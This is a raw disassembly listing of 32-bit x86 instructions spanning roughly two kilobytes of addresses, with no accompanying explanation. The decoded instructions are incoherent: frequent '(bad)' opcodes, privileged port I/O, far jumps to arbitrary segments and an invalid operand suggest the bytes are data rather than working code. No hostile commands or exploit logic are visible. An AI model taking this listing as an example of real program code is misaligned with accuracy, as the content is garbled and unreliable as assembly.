  441518:	xlat   BYTE PTR ds:[ebx]
  441519:	mov    dh,0xee
  44151b:	adc    edx,ebx
  44151d:	repnz mov eax,ds:0xb861475a
  441523:	mov    ah,0xda
  441525:	jns    0x441596
  441527:	call   0xc7f4:0x68ee0c04
  44152e:	lea    edi,[eax-0x5ee95a73]
  441534:	pop    eax
  441535:	push   cs
  441536:	jns    0x4414dc
  441538:	cs pop ds
  44153a:	ret    0xcec3
  44153d:	(bad)  
  44153e:	out    dx,al
  44153f:	cwde   
  441540:	fbld   TBYTE PTR [ebp+0x37]
  441543:	mov    BYTE PTR [esi+0x5bafc188],bl
  441549:	lods   eax,DWORD PTR ds:[esi]
  44154a:	ins    DWORD PTR es:[edi],dx
  44154b:	lea    edx,[edx-0x7a3fc792]
  441551:	popa   
  441552:	dec    esi
  441553:	add    BYTE PTR ds:0xccdbea60,ch
  441559:	xor    BYTE PTR [esi],dh
  44155b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44155c:	mov    bh,0x94
  44155e:	call   0x55ed:0xdfe15d6d
  441565:	mov    al,ds:0xd71ece95
  44156a:	fadd   DWORD PTR [edx+0x728860b3]
  441570:	xlat   BYTE PTR ds:[ebx]
  441571:	popf   
  441572:	mov    esp,0xee702a9a
  441577:	rol    DWORD PTR [eax*8+0x10d11b67],1
  44157e:	shl    DWORD PTR [edi-0x39750dfd],0xbc
  441585:	mov    edi,0x95524320
  44158a:	jo     0x4415fd
  44158c:	arpl   WORD PTR [eax+0x60f0eb67],di
  441592:	outs   dx,BYTE PTR ds:[esi]
  441593:	dec    ebp
  441594:	or     BYTE PTR [esi-0x50],dh
  441597:	mov    WORD PTR [edx+0x5e],cs
  44159a:	sub    al,0xf
  44159c:	or     ebx,DWORD PTR [edx]
  44159e:	jl     0x441558
  4415a0:	xor    DWORD PTR [eax-0xb],0xffffff84
  4415a4:	pop    ss
  4415a5:	mov    cl,bl
  4415a7:	fstp   QWORD PTR [esi-0x65]
  4415aa:	test   eax,0xc700a10
  4415af:	imul   eax,ecx,0x5d
  4415b2:	add    BYTE PTR [eax],bl
  4415b4:	xor    BYTE PTR [eax-0x2729ce44],bh
  4415ba:	lds    eax,FWORD PTR [eax]
  4415bc:	pop    esi
  4415bd:	dec    ebx
  4415be:	sub    esp,DWORD PTR ds:0xa1a76b6f
  4415c4:	mov    ebx,0x1429da60
  4415c9:	pop    esi
  4415ca:	mov    esp,0xee30e07f
  4415cf:	test   BYTE PTR [ecx],cl
  4415d1:	push   edx
  4415d2:	add    al,0xf
  4415d4:	popa   
  4415d5:	(bad)  
  4415d6:	int3   
  4415d7:	mov    al,ds:0x88faf4db
  4415dc:	jmp    0x4415df
  4415de:	in     eax,dx
  4415df:	in     al,0x82
  4415e1:	mov    al,ds:0xc4636ded
  4415e6:	les    esp,FWORD PTR [edi+0xb5aa02b]
  4415ec:	ficomp DWORD PTR [edx+eiz*2-0x3]
  4415f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4415f1:	jle    0x44165f
  4415f3:	and    ebp,edi
  4415f5:	mov    al,ds:0xaa5fc442
  4415fa:	xchg   esi,eax
  4415fb:	aad    0xe8
  4415fd:	enter  0x30e5,0xb8
  441601:	jecxz  0x4415cc
  441603:	(bad)  
  441604:	jl     0x4415f1
  441606:	dec    esi
  441607:	out    dx,al
  441608:	pop    esi
  441609:	clc    
  44160a:	xor    DWORD PTR [ebx+0x3ccf5d9],eax
  441610:	pop    esi
  441611:	jg     0x44162f
  441613:	dec    ecx
  441614:	int    0xbc
  441616:	aas    
  441617:	push   0x27c660b9
  44161c:	cmp    edx,DWORD PTR [ecx-0x3d88a556]
  441622:	add    ch,al
  441624:	loopne 0x44165d
  441626:	out    dx,al
  441627:	icebp  
  441628:	xchg   edx,eax
  441629:	xlat   BYTE PTR ds:[ebx]
  44162a:	mov    eax,ds:0x4a609196
  44162f:	pusha  
  441630:	cmp    al,0xad
  441632:	jle    0x44165f
  441634:	cs icebp 
  441636:	out    dx,al
  441637:	or     al,0xc1
  441639:	or     eax,0x7024ccd9
  44163e:	jno    0x4415e8
  441640:	sar    BYTE PTR [eax-0x6edad77c],1
  441646:	jp     0x4415cc
  441648:	shr    DWORD PTR [ecx],cl
  44164a:	out    dx,al
  44164b:	jne    0x441648
  44164d:	mov    al,0xa7
  44164f:	cmp    esp,DWORD PTR es:[ecx+ebp*1]
  441653:	mov    eax,ds:0xe6e322af
  441658:	loope  0x441632
  44165a:	(bad)  
  44165c:	pop    esi
  44165d:	les    ebx,FWORD PTR [esp+eiz*2+0x14a741c9]
  441664:	mov    edx,0x8fe8c760
  441669:	fist   WORD PTR [eax+edi*4]
  44166c:	push   es
  44166d:	mov    ch,0xf0
  44166f:	lahf   
  441670:	js     0x4416f0
  441672:	scas   eax,DWORD PTR es:[edi]
  441673:	xor    al,0x37
  441676:	aaa    
  441677:	push   0x3
  441679:	sub    eax,0x1620a243
  44167e:	adc    DWORD PTR [esi],ebp
  441680:	fwait
  441681:	add    eax,esi
  441683:	jo     0x44167a
  441685:	das    
  441686:	out    dx,al
  441687:	cmp    DWORD PTR [ebp+edx*2-0x6959f939],esi
  44168e:	pop    esp
  44168f:	mov    eax,ds:0xf03e4cad
  441694:	std    
  441695:	dec    ebp
  441696:	test   esi,eax
  441698:	pop    esi
  441699:	pop    ebp
  44169a:	sbb    BYTE PTR [eax+0x16],0xff
  44169e:	pop    ebx
  44169f:	or     edi,DWORD PTR [edx-0x35]
  4416a2:	(bad)  
  4416a3:	nop
  4416a4:	jmp    0x44169b
  4416a6:	in     eax,dx
  4416a7:	(bad)  
  4416a8:	and    DWORD PTR [eax+edi*1+0x50],edi
  4416ac:	pushf  
  4416ad:	dec    ecx
  4416ae:	pop    edx
  4416af:	xchg   edi,eax
  4416b0:	sub    esp,DWORD PTR [ecx-0x5d]
  4416b3:	mov    edi,0x550508d2
  4416b8:	ret    
  4416b9:	xchg   ebx,eax
  4416ba:	add    BYTE PTR ds:0x32ec77f,bh
  4416c0:	mov    ebp,0xdcc24005
  4416c5:	js     0x4416c4
  4416c7:	jp     0x44173d
  4416c9:	pusha  
  4416ca:	repz mov WORD PTR [ebx+0x64],gs
  4416ce:	in     eax,dx
  4416cf:	push   ss
  4416d0:	imul   edx,DWORD PTR [esi+eax*4-0x18ed9ae2],0x52614319
  4416db:	bound  edi,QWORD PTR [ecx-0x185f1f2e]
  4416e1:	sbb    DWORD PTR [edi-0x75],eax
  4416e4:	add    eax,0xeadac1cb
  4416e9:	pop    ds
  4416ea:	and    eax,0xee240ec9
  4416ef:	push   edx
  4416f0:	cmc    
  4416f1:	sub    dl,al
  4416f3:	sub    DWORD PTR [ecx-0x7e911eed],ebp
  4416f9:	pusha  
  4416fa:	std    
  4416fb:	jmp    0x4416b7
  4416fd:	out    dx,al
  4416fe:	push   esi
  4416ff:	(bad)  [esi+0x5]
  441702:	bound  ebx,QWORD PTR [eax]
  441704:	pop    ebx
  441705:	sar    DWORD PTR [edi+0x4],0x3f
  441709:	aas    
  44170a:	cs clc 
  44170c:	jp     0x44169a
  44170e:	adc    al,0xa1
  441710:	jne    0x44176d
  441712:	ss loope 0x441730
  441715:	fnstenv [edx]
  441717:	sub    ah,BYTE PTR [esi+eiz*4+0x61]
  44171b:	push   edi
  44171c:	jae    0x4416de
  44171e:	and    DWORD PTR [edx-0x5ea8bbd1],0xffffffaa
  441725:	shr    DWORD PTR [eax+edi*4],1
  441728:	mov    ebp,0x5ed5c4c4
  44172d:	push   es
  44172e:	sub    cl,BYTE PTR [ecx-0x58cda18a]
  441734:	shl    DWORD PTR [eax+0x31],1
  441737:	push   es
  441738:	stos   BYTE PTR es:[edi],al
  441739:	daa    
  44173a:	xchg   esi,eax
  44173b:	dec    edi
  44173c:	xchg   edx,eax
  44173d:	scas   eax,DWORD PTR es:[edi]
  44173e:	jle    0x441733
  441740:	pop    esi
  441741:	loop   0x44173c
  441743:	(bad)  
  441744:	fmul   st(2),st
  441746:	pop    edx
  441747:	enter  0x6141,0x52
  44174b:	jmp    0xf0aabf02
  441750:	or     eax,0x6be0ee8c
  441755:	nop
  441756:	and    edi,DWORD PTR [eax-0x5df89937]
  44175c:	mov    eax,ds:0xa067c8f9
  441761:	sbb    BYTE PTR [edi-0x11cfe77f],cl
  441767:	inc    edx
  441768:	arpl   dx,ax
  44176a:	push   ebp
  44176b:	icebp  
  44176c:	repnz push cs
  44176e:	mov    cl,0xa0
  441770:	pop    ds
  441771:	dec    esp
  441772:	test   DWORD PTR [edx+0x56d333e0],ebp
  441778:	pop    esi
  441779:	das    
  44177a:	cwde   
  44177b:	dec    DWORD PTR ds:0xfaace31f
  441781:	pusha  
  441782:	or     DWORD PTR [ecx],esi
  441784:	imul   esi,DWORD PTR es:[ecx],0x4
  441788:	out    0xf3,eax
  44178a:	out    dx,al
  44178b:	push   es
  44178c:	ss (bad) 
  44178e:	call   0xbb0bfe0a
  441793:	mov    al,ds:0xfef7d677
  441798:	adc    ebx,DWORD PTR ds:0xd13bf9a1
  44179e:	push   ds
  44179f:	mov    eax,ds:0x696b0e34
  4417a4:	shl    BYTE PTR [eax+0x6e],cl
  4417a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4417a8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4417aa:	cwde   
  4417ab:	push   edx
  4417ac:	or     edi,esi
  4417ae:	out    dx,al
  4417af:	xchg   edx,eax
  4417b0:	in     al,0x14
  4417b2:	jmp    0xf1a2:0x6ff32a32
  4417b9:	push   esi
  4417ba:	mov    ebp,0x137a89fd
  4417bf:	push   ebp
  4417c0:	outs   dx,DWORD PTR ds:[esi]
  4417c1:	icebp  
  4417c2:	and    BYTE PTR [ebx],ah
  4417c4:	xlat   BYTE PTR ds:[ebx]
  4417c5:	(bad)  
  4417c6:	(bad)  
  4417c7:	aaa    
  4417c8:	fwait
  4417c9:	fwait
  4417ca:	dec    ecx
  4417cb:	adc    edi,DWORD PTR [esi+0x10]
  4417ce:	sahf   
  4417cf:	mov    ah,BYTE PTR [edi+0xb934d60]
  4417d5:	adc    al,0xa6
  4417d7:	jb     0x441854
  4417d9:	je     0x4417a9
  4417db:	lds    ebx,FWORD PTR [esi]
  4417dd:	jbe    0x4417e9
  4417df:	(bad)  [ebx]
  4417e1:	popa   
  4417e2:	pop    esi
  4417e3:	dec    edx
  4417e4:	pop    ebp
  4417e5:	lds    edx,FWORD PTR [edi-0x7b]
  4417e8:	mov    edi,0x3da4f0ec
  4417ed:	mov    ch,0x4b
  4417ef:	popa   
  4417f0:	jge    0x441800
  4417f2:	repnz retf 0x451b
  4417f6:	pop    ebp
  4417f7:	and    al,0xd8
  4417f9:	(bad)  
  4417fb:	mov    ebx,0xc951c125
  441800:	mov    al,bh
  441802:	push   ecx
  441803:	dec    ebp
  441804:	add    BYTE PTR [ebx-0x57dcec12],cl
  44180a:	test   eax,0x364147c2
  44180f:	test   al,0xf8
  441811:	test   DWORD PTR [ebx-0x6f],esp
  441814:	fs popa 
  441816:	cmp    esi,edi
  441818:	mov    bl,0x99
  44181a:	out    dx,al
  44181b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44181c:	jge    0x441803
  44181e:	in     al,dx
  44181f:	jbe    0x441847
  441821:	or     BYTE PTR [ecx+0x3cf148a4],0xf8
  441828:	out    dx,al
  441829:	sub    eax,0xf342707e
  44182e:	in     eax,dx
  44182f:	arpl   si,bx
  441831:	jp     0x44181b
  441833:	jecxz  0x4417cb
  441835:	bound  eax,QWORD PTR [esi+0x46]
  441838:	icebp  
  441839:	pusha  
  44183a:	mov    ds:0x2ae7912,al
  44183f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441840:	daa    
  441841:	xchg   DWORD PTR [edx],esp
  441843:	les    ebx,FWORD PTR [eax+eiz*2-0x63e7c7a8]
  44184a:	test   DWORD PTR [edi],0xad2d6059
  441850:	lea    ebx,[esi+0x48]
  441853:	jno    0x4417e1
  441855:	mov    eax,0xc5b53d1
  44185a:	dec    edi
  44185b:	xor    ecx,edx
  44185d:	inc    esi
  44185e:	mov    ?,WORD PTR [ebx-0x16]
  441861:	sbb    ah,bl
  441863:	mov    al,ds:0x3c27bd92
  441868:	cld    
  441869:	sbb    eax,0xc25e8dfd
  44186e:	or     al,BYTE PTR [edi+eax*4]
  441871:	je     0x4418b2
  441873:	test   eax,0xf3866080
  441878:	inc    esi
  441879:	rcl    BYTE PTR [edi+0x12],0x2
  44187d:	fs out 0xa9,eax
  441880:	sbb    eax,0x8e25cff4
  441885:	cdq    
  441886:	jnp    0x441878
  441888:	jnp    0x4418dc
  44188a:	jl     0x44181c
  44188c:	pop    edx
  44188d:	cmp    al,0x4e
  44188f:	sub    eax,0xd1c34fef
  441894:	pop    esi
  441895:	fistp  WORD PTR [edi+0x8]
  441898:	jg     0x441900
  44189a:	push   ebp
  44189b:	jne    0x4418c9
  44189d:	popa   
  44189e:	add    ebp,ebp
  4418a0:	jnp    0x44187a
  4418a2:	mov    DWORD PTR [ecx+0x27],ebp
  4418a5:	repnz out dx,al
  4418a7:	loop   0x4418b0
  4418a9:	xchg   esp,eax
  4418aa:	int3   
  4418ab:	jecxz  0x44192a
  4418ad:	das    
  4418ae:	adc    DWORD PTR [ecx],ebp
  4418b0:	xor    ah,BYTE PTR [ecx+0x47]
  4418b3:	loopne 0x441898
  4418b5:	enter  0x3f93,0xbc
  4418b9:	xchg   ecx,eax
  4418ba:	fcmovnu st,st(1)
  4418bc:	pop    esi
  4418bd:	jb     0x44190e
  4418bf:	lock xor bh,BYTE PTR [eax]
  4418c2:	std    
  4418c3:	pop    ebp
  4418c4:	push   ds
  4418c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4418c6:	sbb    eax,0x43a515a1
  4418cb:	mov    ebp,0x26411c44
  4418d0:	pop    esi
  4418d1:	outs   dx,DWORD PTR ds:[esi]
  4418d2:	pop    ecx
  4418d3:	mov    esp,DWORD PTR [ecx]
  4418d5:	cli    
  4418d6:	je     0x4418d3
  4418d8:	bound  esp,QWORD PTR [esi-0x64]
  4418db:	sbb    bl,dh
  4418dd:	jns    0x44187c
  4418df:	adc    eax,0xf6e75c86
  4418e4:	pop    esi
  4418e5:	and    eax,0x9b729a6a
  4418ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4418eb:	fld    TBYTE PTR [ecx+eiz*2]
  4418ee:	lods   al,BYTE PTR ds:[esi]
  4418ef:	mov    bh,0xb6
  4418f1:	dec    esi
  4418f2:	adc    DWORD PTR [ebp+0x71],esi
  4418f5:	add    al,0xee
  4418f7:	stos   BYTE PTR es:[edi],al
  4418f8:	mov    ecx,0x5cf71b8d
  4418fd:	test   BYTE PTR [esi-0x775b5c60],dh
  441903:	ret    0x202c
  441906:	sbb    eax,0x4e115d64
  44190b:	loope  0x4418e1
  44190d:	out    0x7b,al
  44190f:	call   0x50f:0xa0c446ee
  441916:	mov    DWORD PTR [ecx-0x39b425ed],edi
  44191c:	push   ecx
  44191d:	outs   dx,DWORD PTR ds:[esi]
  44191e:	push   ds
  44191f:	ds loopne 0x4418f6
  441922:	and    DWORD PTR gs:[eax+0x20],esi
  441926:	js     0x4419a3
  441928:	mov    ch,0x60
  44192a:	mov    eax,0x895a64d9
  44192f:	adc    ecx,DWORD PTR [ecx+0x7c]
  441932:	out    dx,al
  441933:	stos   DWORD PTR es:[edi],eax
  441934:	mov    ebp,0x5522a7b7
  441939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44193a:	sbb    ah,BYTE PTR [ecx-0x29073427]
  441940:	ret    0x3a29
  441943:	std    
  441944:	pop    esi
  441945:	adc    DWORD PTR [ecx],esp
  441947:	out    dx,al
  441948:	mov    esp,0xafba2653
  44194d:	cs push ds
  44194f:	mov    eax,ds:0xde8f97c5
  441954:	mov    eax,0x65b43ad4
  441959:	jmp    0xdc7d:0xe11aaa70
  441960:	nop
  441961:	aas    
  441962:	sbb    eax,0x644ac8a8
  441967:	mov    bh,BYTE PTR [edx]
  441969:	jno    0x441949
  44196b:	fwait
  44196c:	inc    esp
  44196d:	ss into 
  44196f:	jae    0x44196b
  441971:	out    0xcf,eax
  441973:	adc    cl,al
  441975:	pusha  
  441976:	jl     0x44191a
  441978:	adc    ah,bl
  44197a:	xchg   esi,eax
  44197b:	jo     0x441981
  44197d:	adc    bl,bh
  44197f:	ficomp WORD PTR [esi+0x17]
  441982:	mov    cl,0xf7
  441984:	dec    ecx
  441985:	xchg   ebp,eax
  441986:	test   BYTE PTR [esi-0xec59ea6],bl
  44198c:	adc    al,0xb8
  44198e:	dec    esi
  44198f:	lods   al,BYTE PTR ds:[esi]
  441990:	xchg   ebp,eax
  441991:	jle    0x44198a
  441993:	dec    ebx
  441994:	fwait
  441995:	in     al,0xee
  441997:	xchg   edx,eax
  441998:	pop    ebx
  441999:	jbe    0x441997
  44199b:	cli    
  44199c:	out    0x51,eax
  44199e:	or     ch,BYTE PTR [ebx+ebp*2+0x9]
  4419a2:	mov    ds,WORD PTR [ebp+esi*1-0x7c]
  4419a6:	out    dx,eax
  4419a7:	scas   al,BYTE PTR es:[edi]
  4419a8:	pop    esi
  4419a9:	pushf  
  4419aa:	push   eax
  4419ab:	mov    esi,0x12e2148e
  4419b0:	(bad)  
  4419b1:	pusha  
  4419b2:	lahf   
  4419b3:	ins    BYTE PTR es:[edi],dx
  4419b4:	mov    cl,0x2f
  4419b6:	test   eax,0xe7db5ac6
  4419bb:	xchg   edi,eax
  4419bc:	jmp    0x44194b
  4419be:	repz les edi,FWORD PTR [ebp-0x70]
  4419c2:	int3   
  4419c3:	inc    esi
  4419c4:	jbe    0x441a25
  4419c6:	out    0x28,eax
  4419c8:	mov    bl,BYTE PTR [edi-0x72]
  4419cb:	adc    ch,BYTE PTR [edi-0xc]
  4419ce:	fiadd  WORD PTR [esi-0x15d85edf]
  4419d4:	mul    DWORD PTR [ecx+0x69e6b0ed]
  4419da:	ret    
  4419db:	push   ds
  4419dc:	adc    eax,0xc7312a6f
  4419e1:	pusha  
  4419e2:	add    al,0xb6
  4419e4:	dec    eax
  4419e5:	loope  0x441a18
  4419e7:	inc    eax
  4419e8:	pop    edx
  4419e9:	inc    edx
  4419ea:	add    BYTE PTR [esi+0x29418c62],cl
  4419f0:	lods   eax,DWORD PTR fs:[esi]
  4419f2:	pop    ebp
  4419f3:	loope  0x4419b9
  4419f5:	jae    0x441a17
  4419f7:	xor    eax,0xbefa6148
  4419fc:	addr16 add al,0x30
  4419ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441a00:	push   ss
  441a01:	xor    ch,ch
  441a03:	mov    dh,0xb0
  441a05:	addr16 icebp 
  441a07:	je     0x441a49
  441a09:	inc    edi
  441a0a:	into   
  441a0b:	imul   edx,DWORD PTR [edi+0x8116e60],0xffffffa6
  441a12:	mov    dl,0xc9
  441a14:	push   0x901eeee6
  441a19:	pop    ebp
  441a1a:	lahf   
  441a1b:	stos   DWORD PTR es:[edi],eax
  441a1c:	fst    DWORD PTR [edx+0x65eea0f6]
  441a22:	div    esi
  441a24:	xchg   edi,eax
  441a25:	push   ds
  441a26:	imul   edi,DWORD PTR [esi],0x5e
  441a29:	sub    bh,BYTE PTR [eax]
  441a2b:	jmp    0x6144:0x62d63a2e
  441a32:	pop    esp
  441a33:	sub    DWORD PTR gs:[ebx],ebx
  441a36:	sub    DWORD PTR [ecx],edi
  441a38:	xchg   edi,eax
  441a39:	fsubr  st(4),st
  441a3b:	divps  xmm7,XMMWORD PTR [ecx+0x40]
  441a3f:	cdq    
  441a40:	gs (bad) 
  441a43:	sbb    esp,DWORD PTR [esi]
  441a45:	inc    ebx
  441a46:	cld    
  441a47:	mov    bl,0x9f
  441a49:	in     al,0x6e
  441a4b:	cwde   
  441a4c:	cld    
  441a4d:	jno    0x441abe
  441a4f:	cmp    eax,DWORD PTR [ebx]
  441a51:	sub    bl,0x2e
  441a54:	adc    al,BYTE PTR [ecx+ebx*2]
  441a57:	jmp    0x60bf:0x32b7d0b5
  441a5e:	sbb    ah,ch
  441a60:	jb     0x441aa3
  441a62:	sar    BYTE PTR [esi+0x4a208d2c],0xad
  441a69:	loopne 0x441ac9
  441a6b:	out    0xb7,eax
  441a6d:	arpl   dx,dx
  441a6f:	dec    esi
  441a70:	mov    eax,0xdac7f842
  441a75:	loopne 0x441a39
  441a77:	push   0x751bd307
  441a7c:	pop    esi
  441a7d:	or     BYTE PTR [ecx-0x25],0xc5
  441a81:	xor    al,0xcb
  441a83:	xchg   esp,eax
  441a84:	daa    
  441a85:	popa   
  441a86:	jbe    0x441ab9
  441a88:	mov    bl,0xd7
  441a8a:	xchg   esp,eax
  441a8b:	nop
  441a8c:	pop    edi
  441a8d:	jg     0x441a7d
  441a8f:	repz test DWORD PTR [esi-0x43],0x819ff807
  441a97:	mov    eax,ds:0xed880629
  441a9c:	mov    dl,0x79
  441a9e:	gs loop 0x441aff
  441aa1:	stos   BYTE PTR es:[edi],al
  441aa2:	add    al,0x73
  441aa4:	pop    es
  441aa5:	and    al,0x68
  441aa7:	cmp    ch,BYTE PTR [ebp-0x45]
  441aaa:	xor    dl,BYTE PTR [ebp+eax*2-0x5b]
  441aae:	imul   esp,DWORD PTR [ecx-0x5c369543],0x448f878c
  441ab8:	and    ch,BYTE PTR [ecx+edi*2-0x7984875f]
  441abf:	hlt    
  441ac0:	xchg   esp,eax
  441ac1:	or     DWORD PTR [edx-0x45fa635f],0xc
  441ac8:	mov    ?,ebx
  441aca:	shl    esp,1
  441acc:	pop    esi
  441acd:	push   0xc91e34a8
  441ad2:	loope  0x441a68
  441ad4:	dec    ebp
  441ad5:	popa   
  441ad6:	call   0xb554c402
  441adb:	adc    eax,0x7edbb04b
  441ae0:	cmp    cl,dl
  441ae2:	sbb    ah,BYTE PTR [ecx]
  441ae4:	pop    edx
  441ae5:	aam    0x4a
  441ae7:	aam    0x40
  441ae9:	push   ebx
  441aea:	in     al,dx
  441aeb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  441aec:	scas   eax,DWORD PTR es:[edi]
  441aed:	mov    dh,0xc8
  441aef:	or     eax,0xee35a13c
  441af4:	sbb    al,0xb6
  441af6:	out    dx,al
  441af7:	stos   BYTE PTR es:[edi],al
  441af8:	mov    cl,0xb2
  441afa:	leave  
  441afb:	pop    eax
  441afc:	jae    0x441acc
  441afe:	daa    
  441aff:	(bad)
  441b02:	mov    bh,0xa0
  441b04:	mov    dh,0xa7
  441b06:	xor    al,0xac
  441b08:	mov    ah,BYTE PTR [edx-0x12]
  441b0b:	sbb    BYTE PTR [esi-0x21],ch
  441b0e:	or     al,0x69
  441b10:	push   es
  441b11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  441b12:	inc    ebp
  441b13:	hlt    
  441b14:	dec    esp
  441b15:	popa   
  441b16:	push   0x746d4440
  441b1b:	popa   
  441b1c:	test   DWORD PTR [ebx+0xf942dee],esp
  441b22:	xor    DWORD PTR [esi-0x5f506a11],0x2f
  441b29:	stos   DWORD PTR es:[edi],eax
  441b2a:	ror    DWORD PTR [edi+0x1e],1
  441b2d:	fbstp  TBYTE PTR [ebx+0x1e]
  441b30:	pop    esi
  441b31:	inc    esp
  441b32:	and    eax,0x23bafcf3
  441b37:	cli    
  441b38:	clc    
  441b39:	sar    BYTE PTR [ecx+eiz*4+0x41],0xe3
  441b3e:	push   edi
  441b3f:	fnstcw WORD PTR ds:[edi-0x4c]
  441b43:	pop    ebp
  441b44:	pop    ebp
  441b45:	adc    BYTE PTR [bp+di-0x69],ch
  441b49:	inc    ecx
  441b4a:	mov    ebp,0x10a134c6
  441b4f:	inc    ebp
  441b50:	mov    ah,BYTE PTR [ebx-0x5d034712]
  441b56:	mov    edi,0x85c51e99
  441b5b:	mov    eax,ds:0xd6937189
  441b60:	jle    0x441af3
  441b62:	fild   WORD PTR [edx+0x5e]
  441b65:	cmp    DWORD PTR [eax+0x54],edx
  441b68:	retf   
  441b69:	pop    edx
  441b6a:	ficom  WORD PTR [ecx-0x43f2a175]
  441b70:	data16 lods al,BYTE PTR ds:[esi]
  441b72:	mov    ds:0xd3bafe29,al
  441b77:	cmp    BYTE PTR [esi-0x21],bl
  441b7a:	mov    edi,0x1fe02843
  441b7f:	retf   0x5c6d
  441b82:	push   ebx
  441b83:	fidivr WORD PTR [ecx+0xe]
  441b86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  441b87:	and    al,0x65
  441b89:	dec    edx
  441b8a:	ds clc 
  441b8c:	push   cs
  441b8d:	xor    al,0x20
  441b8f:	mov    BYTE PTR [ecx+eiz*8],dh
  441b92:	and    al,0x50
  441b94:	jp     0x441be9
  441b96:	ret    
  441b97:	or     ebp,DWORD PTR [esi]
  441b99:	dec    edi
  441b9a:	mov    ebx,0x84450b55
  441b9f:	mov    eax,ds:0xba999441
  441ba4:	inc    eax
  441ba5:	and    dh,bl
  441ba7:	stos   DWORD PTR es:[edi],eax
  441ba8:	adc    edi,DWORD PTR [ecx+0x4d92a112]
  441bae:	aam    0x53
  441bb0:	nop
  441bb1:	pusha  
  441bb2:	arpl   WORD PTR ds:0x2720b120,cx
  441bb8:	fst    QWORD PTR [ebx]
  441bba:	or     BYTE PTR [ebp+0x25],dl
  441bbd:	dec    ecx
  441bbe:	jmp    0x441b66
  441bc0:	and    DWORD PTR [eax-0x78e58570],0x32
  441bc7:	cmp    eax,0x32ed60a4
  441bcc:	ja     0x441bbb
  441bce:	sbb    eax,0xee8c7805
  441bd3:	xlat   BYTE PTR gs:[ebx]
  441bd5:	xor    al,0xe6
  441bd7:	xchg   ecx,eax
  441bd8:	jmp    DWORD PTR [ebx+0x6c]
  441bdb:	call   0xc55f:0x4890e656
  441be2:	inc    ebx
  441be3:	add    esi,ebx
  441be5:	mov    ecx,0x955e993b
  441bea:	cmp    DWORD PTR [edx],0x88d822d5
  441bf0:	mov    dl,0x60
  441bf2:	adc    edi,DWORD PTR [ebx-0x6e757f3d]
  441bf8:	imul   esi,DWORD PTR [esp+ebx*8],0xa8b25ded
  441bff:	aaa    
  441c00:	mov    ecx,0xde90253e
  441c05:	scas   al,BYTE PTR es:[edi]
  441c06:	pop    edi
  441c07:	add    eax,0x875b50a6
  441c0c:	outs   dx,DWORD PTR ds:[esi]
  441c0d:	mov    al,ds:0x2c5e302d
  441c12:	add    al,BYTE PTR [edx+0x6e]
  441c15:	ins    BYTE PTR es:[edi],dx
  441c16:	mov    edi,0x4261116c
  441c1b:	push   0x51
  441c1d:	imul   edi,edx,0xffffff95
  441c20:	sahf   
  441c21:	call   0xe24f3413
  441c26:	js     0x441c88
  441c28:	stos   DWORD PTR es:[edi],eax
  441c29:	fstp   DWORD PTR [edi]
  441c2b:	xor    DWORD PTR [ecx+0x15],ebx
  441c2e:	out    dx,al
  441c2f:	out    0xbf,al
  441c31:	push   cs
  441c32:	sub    eax,0x3adb3936
  441c37:	mov    al,ds:0x1be7200c
  441c3c:	sahf   
  441c3d:	cli    
  441c3e:	out    dx,eax
  441c3f:	cmp    dl,BYTE PTR [edx+0x5d]
  441c42:	out    dx,al
  441c43:	and    eax,0xa9dcb250
  441c48:	jl     0x441be5
  441c4a:	push   ds
  441c4b:	(bad)  
  441c4c:	das    
  441c4d:	in     eax,0x4
  441c4f:	loope  0x441c36
  441c51:	or     DWORD PTR [edi+eax*8+0x13ee24a6],esp
  441c58:	pop    edi
  441c59:	mov    ds:0x4428e36f,eax
  441c5e:	mov    esi,0x64450480
  441c63:	loop   0x441c54
  441c65:	sbb    eax,0x8fa1da98
  441c6a:	pop    esi
  441c6b:	cmp    BYTE PTR [edi+0x42],0xee
  441c6f:	jbe    0x441cc1
  441c71:	push   esp
  441c72:	push   ss
  441c73:	and    DWORD PTR [edx-0x6a],edi
  441c76:	test   al,0xa0
  441c78:	inc    edx
  441c79:	bound  ebp,QWORD PTR [edi]
  441c7b:	mov    bh,0xea
  441c7d:	push   esi
  441c7e:	ret    0x5e09
  441c81:	loop   0x441c87
  441c83:	and    ah,BYTE PTR [eax]
  441c85:	cdq    
  441c86:	imul   edx,DWORD PTR [edi],0x29
  441c89:	popa   
  441c8a:	jbe    0x441cfb
  441c8c:	and    dh,0xf0
  441c8f:	mov    ah,0x33
  441c91:	cld    
  441c92:	adc    ch,BYTE PTR [ecx]
  441c94:	and    eax,0x8353e724
  441c99:	retf   
  441c9a:	push   ds
  441c9b:	cwde   
  441c9c:	or     al,BYTE PTR [eax]
  441c9e:	push   esp
  441c9f:	add    DWORD PTR [eax+0x1575abb0],ebp
  441ca5:	mov    dh,ch
  441ca7:	sub    edi,ebp
  441ca9:	ror    dl,cl
  441cab:	mov    esi,0xa45a3a84
  441cb0:	mov    ah,0xa2
  441cb2:	mov    edx,0x852504ae
  441cb7:	mov    edx,ebx
  441cb9:	lods   al,BYTE PTR ds:[esi]
  441cba:	outs   dx,DWORD PTR ds:[esi]
  441cbb:	push   es
  441cbc:	arpl   dx,ax
  441cbe:	mov    eax,0x46be5bf1
  441cc3:	pop    ss
  441cc4:	repz rcl BYTE PTR [ecx+0x485e4ff3],0xaa
  441ccc:	mov    ds:0x7e939e02,al
  441cd1:	loop   0x441ce8
  441cd3:	xor    esi,DWORD PTR ds:0xc4a3df63
  441cd9:	arpl   WORD PTR es:[ecx-0x79],bx
  441cdd:	mov    BYTE PTR [edx-0x47a68e09],bh
  441ce3:	jg     0x441d1a
  441ce5:	je     0x441cd7
  441ce7:	pusha  
  441ce8:	mov    esp,0x67816aa7
  441ced:	imul   ebx,DWORD PTR [eax+0x1c],0xffffffef
  441cf1:	pusha  
  441cf2:	inc    esi
